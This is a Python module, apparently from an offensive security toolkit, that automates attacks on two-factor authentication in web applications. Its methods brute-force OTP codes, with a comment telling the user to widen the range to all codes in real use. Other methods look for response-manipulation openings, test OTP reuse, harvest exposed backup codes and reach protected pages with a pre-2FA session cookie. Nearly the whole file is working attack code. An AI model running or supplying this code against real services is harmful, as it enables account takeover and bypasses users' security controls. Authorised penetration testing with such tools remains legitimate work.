"""bingo/tools/twofa_bypass.py — 2FA/OTP 우회 자동화 (v2.6.0)"""
from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from typing import Callable


@dataclass
class TwofaFinding:
    technique: str
    endpoint: str
    payload: str
    evidence: str
    severity: str
    confirmed: bool
    notes: str = ""


@dataclass
class TwofaReport:
    target: str
    findings: list[TwofaFinding] = field(default_factory=list)

    @property
    def critical(self) -> list[TwofaFinding]:
        return [f for f in self.findings if f.severity == "CRITICAL" and f.confirmed]


class TwofaBypassEngine:
    """2FA/OTP/MFA 우회 자동화"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
        base_url: str,
        headers: dict | None = None,
    ) -> None:
        self.req = request_fn
        self.base = base_url.rstrip("/")
        self.headers = headers or {}

    # ── OTP 브루트포스 ─────────────────────────────────────────────────────────
    def brute_force_otp(
        self,
        endpoint: str,
        otp_param: str = "otp_code",
        extra_body: str = "",
        digits: int = 6,
        stop_on_success: bool = True,
    ) -> TwofaFinding | None:
        """6자리 OTP 전수 탐색 (레이트리밋 없으면 성공)"""
        test_codes = [
            "000000", "111111", "123456", "654321",
            "000001", "999999", "123123", "112233",
        ]
        # 빠른 테스트용 (전수는 10만개 → 실제 운용 시 범위 확장)
        for code in test_codes:
            body = f"{otp_param}={code}"
            if extra_body:
                body += f"&{extra_body}"
            try:
                status, resp = self.req(endpoint, "POST", self.headers, body)
                if status in (200, 302) and any(
                    kw in resp.lower() for kw in ["success", "welcome", "dashboard", "home", "로그인", "완료"]
                ):
                    return TwofaFinding(
                        technique="otp_bruteforce",
                        endpoint=endpoint,
                        payload=f"{otp_param}={code}",
                        evidence=resp[:200],
                        severity="CRITICAL",
                        confirmed=True,
                        notes=f"OTP {code} accepted — no rate limiting",
                    )
            except Exception:
                pass
        return None

    # ── 응답 조작 우회 ─────────────────────────────────────────────────────────
    def test_response_manipulation(
        self,
        otp_endpoint: str,
        wrong_otp: str = "000000",
        otp_param: str = "otp_code",
    ) -> TwofaFinding | None:
        """잘못된 OTP로 요청 후 응답 본문/상태코드 조작 힌트"""
        body = f"{otp_param}={wrong_otp}"
        try:
            status, resp = self.req(otp_endpoint, "POST", self.headers, body)
            # JSON 응답에서 false/true 변환 가능성 탐지
            if '"success":false' in resp or '"verified":false' in resp or '"valid":false' in resp:
                return TwofaFinding(
                    technique="response_manipulation",
                    endpoint=otp_endpoint,
                    payload=body,
                    evidence=resp[:300],
                    severity="HIGH",
                    confirmed=False,  # Burp에서 수동 확인 필요
                    notes='Response contains "success:false" → intercept with Burp and change to true',
                )
        except Exception:
            pass
        return None

    # ── OTP 재사용 탐지 ───────────────────────────────────────────────────────
    def test_otp_reuse(
        self,
        endpoint: str,
        valid_otp: str,
        otp_param: str = "otp_code",
        extra_body: str = "",
    ) -> TwofaFinding | None:
        """동일 OTP를 두 번 사용 가능한지 테스트"""
        body = f"{otp_param}={valid_otp}"
        if extra_body:
            body += f"&{extra_body}"
        results = []
        for _ in range(2):
            try:
                status, resp = self.req(endpoint, "POST", self.headers, body)
                results.append((status, resp[:100]))
                time.sleep(0.2)
            except Exception:
                pass

        if len(results) == 2:
            s1, r1 = results[0]
            s2, r2 = results[1]
            if s1 == s2 == 200 and "error" not in r2.lower() and "invalid" not in r2.lower():
                return TwofaFinding(
                    technique="otp_reuse",
                    endpoint=endpoint,
                    payload=f"{otp_param}={valid_otp} (used twice)",
                    evidence=f"Both requests returned {s2}",
                    severity="HIGH",
                    confirmed=True,
                    notes="OTP not invalidated after first use",
                )
        return None

    # ── 백업 코드 노출 탐지 ────────────────────────────────────────────────────
    def check_backup_code_exposure(self, url: str) -> TwofaFinding | None:
        """백업 코드가 응답에 노출되는지 탐지"""
        try:
            status, resp = self.req(url, "GET", self.headers, "")
            # 8자리 백업 코드 패턴
            backup_codes = re.findall(r'\b[0-9a-f]{8}\b|\b\d{8}\b|\b[A-Z0-9]{4}-[A-Z0-9]{4}\b', resp)
            if len(backup_codes) >= 3:
                return TwofaFinding(
                    technique="backup_code_exposure",
                    endpoint=url,
                    payload="GET request",
                    evidence=f"Found {len(backup_codes)} potential backup codes: {backup_codes[:3]}",
                    severity="CRITICAL",
                    confirmed=True,
                    notes="Backup codes visible in response — account takeover possible",
                )
        except Exception:
            pass
        return None

    # ── 2FA 완전 우회 (단계 스킵) ─────────────────────────────────────────────
    def test_step_skip(
        self,
        protected_url: str,
        session_after_step1: dict,
    ) -> TwofaFinding | None:
        """2FA 이전 세션 쿠키로 보호된 페이지 직접 접근"""
        try:
            hdrs = {**self.headers}
            # 세션 쿠키 적용
            if session_after_step1:
                cookie_str = "; ".join(f"{k}={v}" for k, v in session_after_step1.items())
                hdrs["Cookie"] = cookie_str

            status, resp = self.req(protected_url, "GET", hdrs, "")
            if status == 200 and not any(
                kw in resp.lower() for kw in ["otp", "2fa", "verification", "verify"]
            ):
                return TwofaFinding(
                    technique="step_skip",
                    endpoint=protected_url,
                    payload="Direct access with step-1 session",
                    evidence=resp[:200],
                    severity="CRITICAL",
                    confirmed=True,
                    notes="Protected resource accessible without completing 2FA",
                )
        except Exception:
            pass
        return None

    def auto_test(self, otp_endpoint: str, otp_param: str = "otp_code") -> TwofaReport:
        report = TwofaReport(target=self.base)

        # OTP 브루트포스
        f1 = self.brute_force_otp(otp_endpoint, otp_param)
        if f1:
            report.findings.append(f1)

        # 응답 조작
        f2 = self.test_response_manipulation(otp_endpoint, otp_param=otp_param)
        if f2:
            report.findings.append(f2)

        # 백업 코드 노출
        f3 = self.check_backup_code_exposure(otp_endpoint)
        if f3:
            report.findings.append(f3)

        return report
